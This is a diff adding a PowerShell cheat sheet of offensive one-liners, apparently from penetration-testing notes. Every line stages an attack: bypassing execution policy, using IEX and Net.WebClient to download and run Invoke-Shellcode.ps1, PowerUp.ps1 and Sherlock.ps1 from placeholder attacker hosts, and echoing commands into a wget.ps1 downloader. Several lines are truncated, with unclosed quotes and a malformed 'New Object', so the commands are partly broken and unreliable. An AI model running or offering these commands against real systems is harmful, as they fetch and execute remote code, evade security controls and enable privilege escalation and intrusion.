@@ -1,0 +1,21 @@
+ Set-ExecutionPolicy Bypass -force; cd C:\Users\<username>\Desktop\; .\test.ps1
+"X (New-Object Net.WebClient).DownloadString(""http://<targetip>:<port>/CodeExecution/Invoke-Shellcode.ps1"
+"cy Bypass -noLogo -Command ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/powerup.ps1"
+"echo $file = ""powerup.ps1"" >>wget.ps1"
+"echo $url = ""http://<attackerip>/powerup.ps1"" >>wget.ps1"
+"echo $webclient.DownloadFile($url,$file) >>wget.ps1"
+"powershell ""IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1"
+"powershell.exe ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/PowerUp.ps1"
+"powershell.exe ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1"
+"powershell.exe -exec bypass -Command ""& {Import-Module .\PowerUp.ps1"
+"powershell.exe -exec bypass -Command ""& {Import-Module .\Sherlock.ps1"
+# change execution policy & download PowerUp.ps1
+# download PowerUp.ps1
+# send the sherlock.ps1
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo IEX(New Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1
+powershell -ExecutionPolicy ByPass -command ./test.ps1
+powershell -ExecutionPolicy ByPass -command C:\Users\<username>\Desktop\test.ps1
+powershell-import C:\tmp\Sherlock.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
